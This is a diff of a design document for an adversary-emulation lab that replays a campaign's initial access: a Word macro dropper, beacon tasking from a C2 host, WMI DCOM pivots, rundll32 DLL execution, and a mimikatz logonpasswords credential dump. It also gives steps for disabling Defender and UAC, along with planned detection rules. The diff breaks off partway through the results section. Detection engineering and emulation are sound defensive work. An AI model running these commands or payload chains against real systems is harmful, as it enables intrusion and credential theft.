@@ -1,207 +1,225 @@
 # Initial Access Chain — Design (remote operator, macro-only delivery, WMI→rundll32)
 
-Trạng thái: **DESIGN** (chờ user duyệt access: vmrun creds, Elastic creds, it.admin, station, docm automation).
-Run trước tham chiếu: `RUN-20260930-01` (ledger + telemetry: `../../docs/telemetry-comparison-c0015-vs-lab.md`,
+Status: **DESIGN** (awaiting access approval: vmrun credentials, Elastic credentials, it.admin, station, docm automation).
+Reference run: `RUN-20260930-01` (ledger + telemetry: `../../docs/telemetry-comparison-c0015-vs-lab.md`,
 `../phase2-operator/operator-phase-context-gaps-runbook.md`).
 
 ## 0. Objectives
 
-1. **Operator remote 100%** — không gõ lệnh trên console WS01/FS01. Mọi kỹ thuật operator (S4–S9) được
-   điều khiển từ trạm operator (C2 host 192.168.50.1) qua C2-SIM tasking + WMI DCOM (T1047), đúng chất
-   "attacker remote".
-2. **Delivery chỉ từ file Word macro** — trước khi victim mở `test.docm`, đĩa WS01 KHÔNG có tool nào;
-   macro tự sinh config/HTA/beacon; DLL + tools phase-2 đến qua HTTP `:8000` (T1105), không thả thẳng.
-3. **G2 — `wmiprvse→rundll32→143.dll`**: diag lại + fix (xem §2 — nghi vấn "ReturnValue=9" là artifact
-   quoting chứ không phải window-station).
-4. **G1 — Security ingest** vào Elastic (nếu user cấp ES access): mở 4624/4625/4648/4672/5140/5145.
-5. **G8 — C2-SIM watchdog** (auto-restart); **G4 — bắt E3 `:8000`** trong verify; G3/G5/G6/G7 cập nhật
-   hướng rule theo kết quả mới.
+1. **100% remote operator** — no commands typed on the WS01/FS01 console. Every operator
+   technique (S4–S9) is driven from the operator station (C2 host 192.168.50.1) through C2-SIM
+   tasking + WMI DCOM (T1047), matching the "remote attacker" profile.
+2. **Delivery from the Word macro only** — before the victim opens `test.docm`, the WS01 disk
+   holds NO tooling; the macro generates config/HTA/beacon itself; the DLL and the phase-2 tools
+   arrive over HTTP `:8000` (T1105), never staged directly.
+3. **G2 — `wmiprvse→rundll32→143.dll`**: diagnose again and remediate (see §2 — the "ReturnValue=9"
+   suspicion is a quoting artifact, not a window-station restriction).
+4. **G1 — Security ingest** into Elastic (if the user grants ES access): enable
+   4624/4625/4648/4672/5140/5145.
+5. **G8 — C2-SIM watchdog** (auto-restart); **G4 — capture E3 `:8000`** in verification;
+   G3/G5/G6/G7 rule directions updated according to new results.
 
-## 1. Phát hiện mới từ điều tra (ảnh hưởng thiết kế)
+## 1. New findings from the investigation (design impact)
 
-| # | Phát hiện | Bằng chứng | Hệ quả |
+| # | Finding | Evidence | Consequence |
 |---|---|---|---|
-| N1 | **"ReturnValue=9 cho MỌI DLL" có lỗ hổng chứng minh**: mọi thử nghiệm với-DLL đều qua `wmic` với chuỗi `\"...\"` (escape quote kiểu cmd không hợp lệ → command line bị băm → CreateProcess lỗi path). `rundll32-alone=0` cho thấy rundll32 KHÔNG bị chặn ở session-0 (bản thân nó chạy được). Diag sạch bằng `Invoke-CimMethod` chưa có kết quả ghi trong ledger. | ledger `RUN-20260930-01` S8b notes; diag `user32.dll,MessageBeep`; `pivot_cim.txt`/`pivot_wmic.txt` | Giả thuyết mới: **G2 có thể SOLVED bằng command line sạch (không quote lồng, không wmic qua cmd)** — cần diag matrix §4.2 trước khi kết luận |
-| N2 | C2-SIM dừng 03:04:38Z ngay sau `result T-BEACON-SLEEP ok` — **không traceback trong log** (stderr ẩn do `-WindowStyle Hidden`) | `c2sim.log` | Watchdog (G8) không chỉ respawn mà phải ghi stderr; kiểm tra nguyên nhân khi lặp lại |
-| N3 | **Residue run cũ**: beacon WS01 (`S1-799c8731a354c9ad`, live) vẫn poll C2-SIM từ 01:09:25 (restart tay) tới giờ; `stage/ws01` còn 143.dll/mimikatz/beacon/config; `build/out` RỖNG | `c2sim.log`, `tasklist` | Trước rerun: cleanup beacon cũ + rebuild payload → `build/out` |
-| N4 | WS01 không trả ICMP (firewall) dù VM đang chạy (4 `vmware-vmx`); FS01/DC01/Kali trả ICMP | ping test | Dùng vmrun làm kênh điều hành guest; WS01 cần mở WMI firewall inbound để operator WMI→WS01 (S7b) |
-| N5 | `vmrun` có sẵn (VMware Workstation, 4 VM chạy): `E:\VM\C0015\{DC01,WS01,FS01}`, Kali ở OneDrive path | host survey | Preflight + artifact + victim-open đều tự động được qua vmrun (chờ creds) |
-| N6 | Elastic 9200/8220 mở từ host (Tailscale); **5601 (Kibana) đóng**; SSH 22 mở (key `elastic01-key.pem`); repo không chứa ES creds (env `ES_USER/ES_PASS` trước đây) | port test | G1 qua Fleet/Kibana API cần tunnel SSH hoặc creds (xem §6) |
+| N1 | **"ReturnValue=9 for ALL DLLs" has a proof gap**: every with-DLL test went through `wmic` with a `\"...\"` string (cmd-style quote escaping that is invalid → command line mangled → CreateProcess path error). `rundll32-alone=0` shows rundll32 is NOT blocked in session-0 (it runs by itself). A clean diagnostic via `Invoke-CimMethod` produced no ledger-recorded result. | ledger `RUN-20260930-01` S8b notes; `user32.dll,MessageBeep` diagnostic; `pivot_cim.txt`/`pivot_wmic.txt` | New hypothesis: **G2 may be resolved with a clean command line (no nested quoting, no wmic through cmd)** — the diagnostic matrix in §4.2 must run before concluding |
+| N2 | C2-SIM stopped at 03:04:38Z right after `result T-BEACON-SLEEP ok` — **no traceback in the log** (stderr hidden due to `-WindowStyle Hidden`) | `c2sim.log` | The watchdog (G8) must not only respawn but also record stderr; investigate the cause when it recurs |
+| N3 | **Residue of previous runs**: the WS01 beacon (`S1-799c8731a354c9ad`, live) has been polling C2-SIM since 01:09:25 (manual restart); `stage/ws01` still contains 143.dll/mimikatz/beacon/config; `build/out` is EMPTY | `c2sim.log`, `tasklist` | Before the run: clean up the stale beacon and rebuild the payloads into `build/out` |
+| N4 | WS01 does not answer ICMP (firewall) although the VM is running (4 `vmware-vmx` processes); FS01/DC01/Kali answer ICMP | ping test | Use vmrun as the guest operation channel; WS01 needs the WMI inbound firewall rule so the operator can reach WS01 via WMI (S7b) |
+| N5 | `vmrun` is available (VMware Workstation, 4 VMs running): `E:\VM\C0015\{DC01,WS01,FS01}`, Kali under a OneDrive path | host survey | Preflight, artifacts and the victim open can all be automated through vmrun (credentials pending) |
+| N6 | Elastic 9200/8220 reachable from the host (Tailscale); **5601 (Kibana) closed**; SSH 22 open (key `elastic01-key.pem`); the repo holds no ES credentials (env `ES_USER/ES_PASS` previously) | port test | G1 via the Fleet/Kibana API needs an SSH tunnel or credentials (see §6) |
 
-## 2. Kiến trúc operator-remote (mới)
+## 2. Remote-operator architecture (new)
 
-### 2.1 Vai trò các kênh
+### 2.1 Channel roles
 
-| Kênh | Dùng cho | Không dùng cho |
+| Channel | Used for | Not used for |
 |---|---|---|
-| **C2-SIM tasking** (`/cmd`, `/runbook`, `/results`) | S4/S5 discovery, download tools (S7b/S8a), WMI pivot (S8b), đọc output | — |
-| **WMI DCOM** từ C2 host (Invoke-CimMethod, cred it.admin, `-Authentication Dcom`) | Elevate beacon-2 trên WS01 (S7b); logon probes S7 (`4625`/`4624`/`4672` trên FS01) | Không điều hành thường xuyên (tasking đủ) |
-| **vmrun** (host→guest) | Preflight 1 lần (Defender/ASR/exclusions, WMI firewall, EnableLUA, icacls, Trust Center), copy docm, mở docm (victim action), artifact pull, cleanup | KHÔNG dùng cho kỹ thuật operator (giữ telemetry sạch) |
-| **HTTP `:8000`** (attack infra) | HTA download DLL (S1, đã có); beacon tasking `Invoke-WebRequest` fetch mimikatz/143.dll/beacon2/config-phase7 (S7b/S8a, T1105) | — |
+| **C2-SIM tasking** (`/cmd`, `/runbook`, `/results`) | S4/S5 discovery, tool downloads (S7b/S8a), WMI pivot (S8b), reading output | — |
+| **WMI DCOM** from the C2 host (Invoke-CimMethod, it.admin credentials, `-Authentication Dcom`) | Elevating beacon-2 on WS01 (S7b); S7 logon probes (`4625`/`4624`/`4672` on FS01) | Routine operations (tasking is sufficient) |
+| **vmrun** (host→guest) | One-time preflight (Defender/ASR/exclusions, WMI firewall, EnableLUA, icacls, Trust Center), copying the docm, opening the docm (victim action), artifact pull, cleanup | NOT for operator techniques (keeps telemetry clean) |
+| **HTTP `:8000`** (attack infrastructure) | HTA DLL download (S1, already in place); beacon tasking `Invoke-WebRequest` fetches of mimikatz/143.dll/beacon2/config-phase7 (S7b/S8a, T1105) | — |
 
-### 2.2 Luồng S4–S9 (Path A — camp-exact, khuyến nghị)
+### 2.2 S4–S9 flow (Path A — camp-exact, recommended)
 
 ```text
-C2 host ──tasking──> beacon-1 (WS01, duc.user)          S4  discovery (runbook 11 lệnh, như cũ)
+C2 host ──tasking──> beacon-1 (WS01, duc.user)          S4  discovery (runbook of 11 commands, as before)
 C2 host ──WMI DCOM (it.admin)──> WS01: wmiprvse→powershell
-        = beacon-2 elevated (session-0, re-register SAME token)   S7b  chạy elevated
+        = beacon-2 elevated (session-0, re-register SAME token)   S7b  elevated execution
 beacon-2 ──tasking──> download mimikatz (http :8000) ──> E11 + E3 :8000 (G4)
 beacon-2 ──tasking──> mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
-                       ──> E10 lsass 0x1010 (nguồn = wmiprvse→powershell→mimikatz chain) + output qua /results
+                       ──> E10 lsass 0x1010 (source = wmiprvse→powershell→mimikatz chain) + output via /results
 beacon-2 ──tasking──> download 143.dll + beacon + config-phase7 (:8000)      S8a
-beacon-2 ──tasking──> copy → \\FS01\C$\C0015\            ──> FS01 E11 (+ S5145 nếu G1 xong)
+beacon-2 ──tasking──> copy → \\FS01\C$\C0015\            ──> FS01 E11 (+ S5145 once G1 is done)
 beacon-2 ──tasking──> WMI DCOM → FS01 CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'
-                        ──> FS01 wmiprvse→rundll32→143.dll→marker+beacon-3   S8b (T1047 gốc)
+                        ──> FS01 wmiprvse→rundll32→143.dll→marker+beacon-3   S8b (original T1047)
 beacon-3 (FS01) ──> register phase7-session2 ──> receipt ART-07-01           S9
 ```
 
-Telemetry kỳ vọng từng bước (bảng chi tiết ở §5.2). Khác biệt so với run cũ: **bỏ hẳn console WS01**
-(S0 runas seed, runas mimikatz, runas wmic) — mọi hop đều mạng-native như camp.
+Expected telemetry per step (detailed table in §5.2). Difference from the previous runs:
+**the WS01 console is dropped entirely** (S0 runas seeding, runas mimikatz, runas wmic) — every hop
+is network-native, as in the campaign.
 
-### 2.3 Path B (dự phòng, nếu WMI→WS01 bị chặn)
+### 2.3 Path B (fallback, if WMI→WS01 is blocked)
 
-Nếu WS01 chặn WMI inbound (firewall không mở được): nâng beacon-2 bằng **scheduled task**
-(`schtasks /create ... /ru it.admin /it`) từ beacon-1 → parent = svchost (Task Scheduler), ghi nhận
-G7a; hoặc WMI từ C2 → FS01 trực tiếp (bỏ hop WS01→FS01, ghi PARTIAL cho "pivot từ WS01").
+If WS01 blocks inbound WMI (firewall cannot be opened): elevate beacon-2 via a **scheduled task**
+(`schtasks /create ... /ru it.admin /it`) from beacon-1 → parent = svchost (Task Scheduler), recorded
+as G7a; or WMI from the C2 host straight to FS01 (skip the WS01→FS01 hop, mark "pivot from WS01" as PARTIAL).
 
-## 3. Delivery redesign — không thả tool thẳng vào máy
+## 3. Delivery redesign — no tools staged on the machine
 
-### 3.1 S1–S3: macro tự sinh toàn bộ stage
+### 3.1 S1–S3: macro self-generates the whole stage
 
-| Trước (run cũ) | Sau (v2) |
+| Before (earlier runs) | After (current) |
 |---|---|
-| `stage_ws01.ps1` copy config.ini + bootstrap.hta + beacon vào `%PUBLIC%\C0015\` (thả thẳng) | Macro (embedded b64) **tự viết** `config.ini` + `bootstrap.hta` + `c0015_beacon.ps1` vào `%PUBLIC%\C0015\` rồi mshta |
-| DLL từ `:8000` lúc runtime | GIỮ NGUYÊN (đã đúng camp: T1105/T1036) |
+| `stage_ws01.ps1` copies config.ini + bootstrap.hta + beacon into `%PUBLIC%\C0015\` (staged directly) | The macro (embedded b64) **writes** `config.ini` + `bootstrap.hta` + `c0015_beacon.ps1` itself into `%PUBLIC%\C0015\`, then launches mshta |
+| DLL from `:8000` at runtime | KEPT (already camp-accurate: T1105/T1036) |
 
-- Trước khi mở docm: đĩa WS01 chỉ có `test.docm` (+ hệ điều hành).
-- Hiện thực: `payloads/packaging/gen_macro_embedded.ps1` — đọc `config.ini` (make_config) + `bootstrap.hta`
-  + `c0015_beacon.ps1` → base64 → transform `payloads/docm/macro_payload.vba` → `stage/ws01/macro_embedded.vba`
-  (thêm `Sub WriteFiles(): ... ADODB.Stream ...` gọi trước `RunEntry`). VBA module ~15KB — dưới giới hạn.
-- `install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba` (giữ nguyên cơ chế COM-inject đã verify).
+- Before the docm is opened: the WS01 disk holds only `test.docm` (+ the operating system).
+- Implementation: `payloads/packaging/gen_macro_embedded.ps1` — reads `config.ini` (make_config) +
+  `bootstrap.hta` + `c0015_beacon.ps1` → base64 → transforms `payloads/docm/macro_payload.vba` →
+  `stage/ws01/macro_embedded.vba` (adds `Sub WriteFiles(): ... ADODB.Stream ...` called before
+  `RunEntry`). The VBA module is ~15KB — under the limit.
+- `install_macro_docm.ps1 -MacroSource stage/ws01/macro_embedded.vba` (the verified COM-inject
+  mechanism is unchanged).
 
-### 3.2 S7b/S8a: tools qua T1105
+### 3.2 S7b/S8a: tools via T1105
 
-- `:8000` publish thêm `tools/` (`mimikatz.exe`, `c0015_143_surrogate.dll`, `c0015_beacon.ps1`,
-  `config-phase7.ini` — các file này là attack-infra, không vào đĩa WS01 trước khi beacon-1 có).
-- beacon tasking: `powershell -NoProfile -Command "Invoke-WebRequest http://192.168.50.1:8000/tools/<f> -OutFile C:\ProgramData\C0015\<f>"`
-  → E11 (FileCreate) + E3 (`:8000`) — đúng dấu hiệu staging T1105, đóng G4.
+- `:8000` additionally publishes `tools/` (`mimikatz.exe`, `c0015_143_surrogate.dll`,
+  `c0015_beacon.ps1`, `config-phase7.ini` — these are attack-infrastructure files and never sit on
+  the WS01 disk before beacon-1 exists).
+- Beacon tasking: `powershell -NoProfile -Command "Invoke-WebRequest http://192.168.50.1:8000/tools/<f> -OutFile C:\ProgramData\C0015\<f>"`
+  → E11 (FileCreate) + E3 (`:8000`) — the exact T1105 staging signature; closes G4.
 
-## 4. Fixes cụ thể (code trong repo)
+## 4. Specific remediations (in-repo code)
 
-| Gap | Fix | File |
+| Gap | Remediation | File |
 |---|---|---|
-| G8 | Watchdog c2sim: respawn + healthcheck port + ghi stderr | `scripts/c2sim_guard.py` (mới), `payloads/packaging/launch_servers.ps1` (chạy guard thay c2sim trực tiếp; `-Stop` giết guard + con) |
-| G2 | Diag matrix (6 variant) trước khi chốt; nếu variant dùng `Invoke-CimMethod`/wmic-sạch trả 0 → **retract "window-station constraint"** trong mọi doc, S8b chuyển sang rundll32 thật | `stage/analysis/wmi_rundll32_diag.ps1` (mới) |
-| G4 | verify thêm: E3 `:8000` (S1 DLL + S7b/S8a tool fetches) + kiểm tra index `logs-windows.security-*` | `stage/analysis/verify_run_evidence.py` |
-| G1 | Fleet policy `C0015-Windows-Endpoints` thêm input `windows.security` (channel Security) — qua Kibana/Fleet API (tunnel SSH tới ELASTIC01) | tài liệu hóa `../../docs/architecture.md` (viết sau khi có creds) |
-| G3 | Giữ rule E10 (0x1010/0x1fffff, nguồn non-system); ghi nguồn mới (wmiprvse chain) | docs update |
-| G6/G5 | Rule dùng `process.entity_id` + parent, dedup theo entity | docs update |
+| G8 | c2sim watchdog: respawn + port healthcheck + stderr capture | `scripts/c2sim_guard.py` (new), `payloads/packaging/launch_servers.ps1` (runs the guard instead of c2sim directly; `-Stop` kills guard + child) |
+| G2 | Diagnostic matrix (6 variants) before concluding; if a variant using `Invoke-CimMethod`/clean wmic returns 0 → **retract the "window-station constraint"** everywhere, and S8b switches to real rundll32 | `stage/analysis/wmi_rundll32_diag.ps1` (new) |
+| G4 | Verification adds: E3 `:8000` (S1 DLL + S7b/S8a tool fetches) + check of the `logs-windows.security-*` index | `stage/analysis/verify_run_evidence.py` |
+| G1 | Fleet policy `C0015-Windows-Endpoints`: add the `windows.security` input (channel Security) — via Kibana/Fleet API (SSH tunnel to ELASTIC01) | documented in `../../docs/architecture.md` (written once credentials exist) |
+| G3 | Keep the E10 rule (0x1010/0x1fffff, non-system source); record the new source (wmiprvse chain) | docs update |
+| G6/G5 | Rules use `process.entity_id` + parent, deduplicated by entity | docs update |
 
-## 5. Run procedure v2 (máy cụ thể — sẽ verify sau khi có access)
+## 5. Run procedure (machine-specific; to be verified once access is granted)
 
-### 5.0 Cleanup residue (trước P0)
+### 5.0 Residue cleanup (before P0)
 
-- [C2] `-Action Stop` (giết C2-SIM cũ pid 13852 + http.server) → kiểm tra beacon WS01 cũ còn poll không,
-  kill qua vmrun (`listProcessesInGuest` → kill powershell beacon pid).
-- [C2] `Remove-Item stage\ws01\*` (bỏ artifact run cũ); `build/out` rebuild.
-- [VS01/FS01] xoá `C:\C0015`, `C:\Tools\mimikatz.exe`, `C:\stage` (còn lại run cũ).
+- [C2] `-Action Stop` (kill the old C2-SIM pid 13852 + http.server) → check whether the old WS01
+  beacon still polls; if so, kill it via vmrun (`listProcessesInGuest` → kill the powershell beacon pid).
+- [C2] `Remove-Item stage\ws01\*` (remove artifacts of earlier runs); rebuild `build/out`.
+- [WS01/FS01] remove `C:\C0015`, `C:\Tools\mimikatz.exe`, `C:\stage` (leftovers of earlier runs).
 
-### 5.1 P0 — preflight (1 lần, tự động qua vmrun + vài gate tay)
+### 5.1 P0 — preflight (one-time, automated via vmrun + a few manual gates)
 
-| Máy | Bước | Kênh |
+| Machine | Step | Channel |
 |---|---|---|
-| C2 | `preflight_vmrun.ps1` khởi tạo cred file (DPAPI clixml, gitignored) | tay 1 lần |
-| Kali | build DLL (`build_dll.sh` + 143.dll) hoặc copy binary sẵn có; `john` (có sẵn) | SSH/vmrun |
-| WS01 | it.admin ∈ Administrators; EnableLUA=0 + reboot (vmrun reset); **WMI firewall inbound mở** (mới — cho S7b); Defender: Tamper OFF → ASR `d1e49aac` OFF + RTM off + exclusions; Trust Center Word: `VBAWarnings=1`, `AccessVBOM=1`, ProtectedView off | vmrun (admin) |
-| FS01 | it.admin ∈ Administrators; WMI firewall mở (đã có); `icacls C:\C0015 Everyone:F`; Defender như trên | vmrun |
+| C2 | `preflight_vmrun.ps1` initializes the credential file (DPAPI clixml, gitignored) | manual once |
+| Kali | build the DLL (`build_dll.sh` + 143.dll) or copy an existing binary; `john` (already present) | SSH/vmrun |
+| WS01 | it.admin ∈ Administrators; EnableLUA=0 + reboot (vmrun reset); **WMI inbound firewall open** (new — for S7b); Defender: Tamper OFF → ASR `d1e49aac` OFF + RTM off + exclusions; Word Trust Center: `VBAWarnings=1`, `AccessVBOM=1`, ProtectedView off | vmrun (admin) |
+| FS01 | it.admin ∈ Administrators; WMI firewall open (already set); `icacls C:\C0015 Everyone:F`; Defender as above | vmrun |
 | C2/WS01/FS01 | Elastic agent healthy (check Fleet) | ES API |
 
-### 5.2 P1 — entry (victim action duy nhất)
+### 5.2 P1 — entry (the only victim action)
 
-1. [C2] `-Action Pre` (server UP, sinh config + embedded vba; kiểm tra LISTENER 2 port).
+1. [C2] `-Action Pre` (servers up, config + embedded vba generated; check BOTH listeners on 2 ports).
 2. [WS01] (vmrun, duc.user) `install_macro_docm.ps1 -MacroSource macro_embedded.vba` → Desktop/test.docm.
-3. [WS01] (vmrun, duc.user) `cmd /c start test.docm` → macro chạy → S1–S3 (macros enabled qua Trust Center;
-   không cần bấm Enable Content — ghi chú lab-config).
+3. [WS01] (vmrun, duc.user) `cmd /c start test.docm` → macro runs → S1–S3 (macros enabled via Trust
+   Center; no "Enable Content" click needed — lab-config note).
 4. [C2] `-Action WaitSession` → `-Action P1`.
 
-Telemetry kỳ vọng S1–S3 (không đổi): E1 `WINWORD→mshta→regsvr32` + E3 `:8000` (DLL) + E1 beacon + E3 `:8080`.
+Expected S1–S3 telemetry (unchanged): E1 `WINWORD→mshta→regsvr32` + E3 `:8000` (DLL) + E1 beacon + E3 `:8080`.
 
-### 5.3 P2 — operator remote
+### 5.3 P2 — remote operator
 
-| # | Bước | Lệnh / kênh | Evidence kỳ vọng |
+| # | Step | Command / channel | Expected evidence |
 |---|---|---|---|
-| 1 | S4 discovery | C2 `-Action P2` (runbook c0015-phase2) | E1 con beacon (WS01) |
-| 2 | S5 share | `-Action Run -Body 'net view \\FS01'` + Get-SmbShare | E1 + E11 found_shares (WS01) |
-| 3 | S7 logon probes (Path A) | C2 `Invoke-CimMethod -ComputerName FS01 -Credential duc.user(wrong)` → fail; `-Credential it.admin` → ok | FS01 **S4625** (460, 424) nếu G1; nếu muốn S4648: giữ 1 bước interactive `net use B` (xem §7 Q4) |
-| 4 | S7b elevate beacon-2 | C2 `Invoke-CimMethod -ComputerName WS01 -Credential it.admin` CommandLine=`powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\C0015\c0015_beacon.ps1 -Config C:\Users\Public\C0015\config.ini` | WS01 E1 **wmiprvse→powershell** (elevated, re-register token) + FS01 4624 khi hop sau |
-| 5 | S7b mimikatz | beacon-2 tasking: download+mimikatz `"privilege::debug" "sekurlsa::logonpasswords" "exit"` → đọc `/results` → crack (john) / provisioned | WS01 E11 mimikatz + **E10 lsass 0x1010 nguồn non-system** + E3 `:8000` |
-| 6 | S8a handoff | beacon-2 tasking: download 143.dll+beacon+config-phase7 → `copy` → `\\FS01\C$\C0015\` | WS01 E11 + FS01 E11 (+ S5145 nếu G1) |
-| 7 | S8b WMI pivot | beacon-2 tasking: `New-CimSession -ComputerName FS01 -Authentication Dcom; Invoke-CimMethod ... CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'` (xem diag §4.2 trước) | **FS01 E1 wmiprvse→rundll32** + E7 143.dll hash=ART-06-01 + E11 marker + 4624 T3 |
+| 1 | S4 discovery | C2 `-Action P2` (runbook c0015-phase2) | E1 child of beacon (WS01) |
+| 2 | S5 shares | `-Action Run -Body 'net view \\FS01'` + Get-SmbShare | E1 + E11 found_shares (WS01) |
+| 3 | S7 logon probes (Path A) | C2 `Invoke-CimMethod -ComputerName FS01 -Credential duc.user(wrong)` → fails; `-Credential it.admin` → ok | FS01 **S4625** (460, 424) once G1; for S4648 keep 1 interactive `net use B` step (see §7 Q4) |
+| 4 | S7b elevate beacon-2 | C2 `Invoke-CimMethod -ComputerName WS01 -Credential it.admin` CommandLine=`powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\C0015\c0015_beacon.ps1 -Config C:\Users\Public\C0015\config.ini` | WS01 E1 **wmiprvse→powershell** (elevated, token re-registered) + FS01 4624 on the next hop |
+| 5 | S7b mimikatz | beacon-2 tasking: download+mimikatz `"privilege::debug" "sekurlsa::logonpasswords" "exit"` → read `/results` → crack (john) / provisioned | WS01 E11 mimikatz + **E10 lsass 0x1010 non-system source** + E3 `:8000` |
+| 6 | S8a handoff | beacon-2 tasking: download 143.dll+beacon+config-phase7 → `copy` → `\\FS01\C$\C0015\` | WS01 E11 + FS01 E11 (+ S5145 once G1) |
+| 7 | S8b WMI pivot | beacon-2 tasking: `New-CimSession -ComputerName FS01 -Authentication Dcom; Invoke-CimMethod ... CommandLine='rundll32.exe C:\C0015\c0015_143_surrogate.dll,LabEntry'` (check the §4.2 diagnostics first) | **FS01 E1 wmiprvse→rundll32** + E7 143.dll hash=ART-06-01 + E11 marker + 4624 T3 |
 | 8 | S9 session-2 | beacon-3 register phase7-session2 | receipt **ART-07-01-<token>** + E3 FS01→:8080 |
 
 ### 5.4 Q — verify + cleanup
 
-- Elastic: `verify_run_evidence.py` (bản v2: thêm :8000 + security) → `run-window-evidence.md`.
-- Cleanup: beacon kill (vmrun), `-Action Stop`, bật lại Defender/ASR/firewall, xoá C:\C0015/C:\Tools/stage.
+- Elastic: `verify_run_evidence.py` (v2: adds :8000 + security) → `run-window-evidence.md`.
+- Cleanup: kill beacons (vmrun), `-Action Stop`, re-enable Defender/ASR/firewall, remove C:\C0015/C:\Tools/stage.
 
-## 6. G1 — Security ingest (chi tiết, chờ creds)
+## 6. G1 — Security ingest (details; credentials pending)
 
-1. Tunnel: `ssh -i elastic01-key.pem <user>@100.77.46.126 -L 5601:localhost:5601` (xác định user SSH).
+1. Tunnel: `ssh -i elastic01-key.pem <user>@100.77.46.126 -L 5601:localhost:5601` (SSH user to be determined).
 2. Fleet API: `GET /api/fleet/agent_policies?kuery=names:"C0015-Windows-Endpoints"` → `POST /api/fleet/package_policies`
    (package `windows`, input eventlog, dataset `windows.security`, channel `Security`, namespace `c0015`).
-3. Chờ agent reload (vài phút) → verify `GET .ds-logs-windows.security-*/_search` có 4624/4625/4672/5145.
-4. Cập nhật `verify_run_evidence.py` query theo index mới; join `winlog.logon.id` (4624) ↔ E10/E1 nếu cần.
+3. Wait for the agent reload (a few minutes) → verify `GET .ds-logs-windows.security-*/_search` returns 4624/4625/4672/5145.
+4. Update the `verify_run_evidence.py` queries to the new index; join `winlog.logon.id` (4624) ↔ E10/E1 when needed.
 
-## 7. Open items — cần user quyết (đi kèm câu hỏi)
+## 7. Open items — decisions requested from the user (each with a question)
 
-| Q | Vấn đề | Lựa chọn đề xuất |
+| Q | Issue | Proposed choice |
 |---|---|---|
-| Q1 | vmrun cần guest creds (user/pass trên command line — lab-only) | Tạo user `C0015\labops` admin (WS01/FS01) + local labops (DC01/Kali) — pass lab-only, gitignored; hoặc dùng creds có sẵn |
-| Q2 | Elastic: `ES_USER/ES_PASS` (+ SSH user cho key) | Cấp để tôi verify + làm G1 (Fleet API) |
-| Q3 | it.admin password dùng cho S7/S8 | Cấp (lab) — dùng qua DPAPI clixml, KHÔNG vào repo/cmdline telemetry; S7 interactive tuỳ chọn |
-| Q4 | Station/diag: Path A (khuyến nghị) vs B; docm mở tự động (vmrun) vs tay | Path A + vmrun open |
+| Q1 | vmrun needs guest credentials (user/pass on the command line — lab-only) | Create `C0015\labops` admin (WS01/FS01) + local labops (DC01/Kali) — lab-only password, gitignored; or reuse the existing credentials |
+| Q2 | Elastic: `ES_USER/ES_PASS` (+ SSH user for the key) | Provide so I can verify and complete G1 (Fleet API) |
+| Q3 | it.admin password used for S7/S8 | Provide (lab) — used via DPAPI clixml, NEVER in the repo/cmdline telemetry; S7 interactive optional |
+| Q4 | Station/diagnostics: Path A (recommended) vs B; docm opened automatically (vmrun) vs manually | Path A + vmrun open |
 
-## 8. Rule pointers (cập nhật dự kiến sau rerun)
+## 8. Rule pointers (planned updates after the run)
 
-- S8b: nếu G2 retract → rule `E1 parent=wmiprvse & child=rundll32 & E7 unsigned-DLL` sống lại (đúng camp);
-  giữ fallback behavior-rule (E7+E3) cho loader-host (G7).
-- S7b: rule E10 lsass (0x1010/0x1fffff, non-system) — nguồn mới là chain wmiprvse→powershell→mimikatz.
-- S7/S8a: khi G1 xong → rule S4624 T3 it.admin→FS01 + S5145 C$ write + join LogonId.
-- G5/G6: mọi count-rule gắn `process.entity_id` (dedup), không raw count.
-## 9. Điều tra mục tiêu #3 — macro self-write files (2026-10-02, kết quả)
+- S8b: if G2 is retracted → the `E1 parent=wmiprvse & child=rundll32 & E7 unsigned-DLL` rule returns
+  (camp-accurate); keep the fallback behavior-rule (E7+E3) for the loader host (G7).
+- S7b: E10 lsass rule (0x1010/0x1fffff, non-system) — the new source is the wmiprvse→powershell→mimikatz chain.
+- S7/S8a: once G1 is done → S4624 T3 it.admin→FS01 rule + S5145 C$ write + LogonId join.
+- G5/G6: every count-rule anchored on `process.entity_id` (dedup), no raw counts.
 
-**Mục tiêu**: trước khi victim mở file, WS01 không có tool — macro trong test.docm tự viết config.ini + bootstrap.hta + c0015_beacon.ps1 (base64 nhúng VBA) vào %PUBLIC%\C0015.
+## 9. Objective #3 investigation — macro self-write of the staged files (2026-10-02, results)
 
-**Phương pháp**: dựng 3 docm chẩn đoán (diag1 COM / diag2 chunked-const / diag3 native-I/O Open/Put) mở qua scheduled-task interactive; test clean-slate (xoá seed → mở test.docm thật).
+**Objective**: before the victim opens the file, WS01 holds no tooling — the macro in test.docm
+writes config.ini + bootstrap.hta + c0015_beacon.ps1 itself (base64 embedded in VBA) into %PUBLIC%\C0015.
 
-**Kết quả (verified Elastic + guest + Application log)**:
-- Word qua VIX (vmrun) → KHÔNG bao giờ chạy macro (0 event kể cả native-I/O).
-- Word qua scheduled-task interactive → chạy lúc được, lúc không (E1 WINWORD→mshta thấy ở 02:25/03:20/03:45/03:53; d6 03:56 mở mà 0 action). Macro execution **phụ thuộc instance Word** — lỗi không nằm ở code WriteFiles.
-- Application log không có lỗi Word (không crash/dialog được log); VBAWarnings/AccessVBOM/ProtectedView đều đã set.
-- d5 (test.docm + pub wiped) → beacon register 03:53:36 — gợi ý WriteFiles có thể chạy ở clean-slate nhưng chưa tái lập ổn định.
-- diag3 native I/O cũng 0 output ở instance không chạy ⇒ vấn đề ở tầng "macro có chạy không", không phải write-code.
+**Method**: built 3 diagnostic documents (diag1 COM / diag2 chunked-const / diag3 native-I/O
+Open/Put) opened through an interactive scheduled task; clean-slate test (seeds removed → the real
+test.docm opened).
 
-**Kết luận**: mode tin cậy hiện tại = seed fallback (đã chứng minh nhiều lần). Để "entry 100% từ macro": cần quan sát console UI của Word trong session duc.user (bắt dialog ẩn/first-run) hoặc dùng manual open; WriteFiles code đã được viết lại hướng native-I/O (chống COM-fail) sẵn sàng re-validate.
+**Results (verified on Elastic + guest + Application log)**:
+- Word via VIX (vmrun) → NEVER runs the macro (0 events, even the native-I/O variant).
+- Word via an interactive scheduled task → runs sometimes and sometimes not (E1 WINWORD→mshta seen
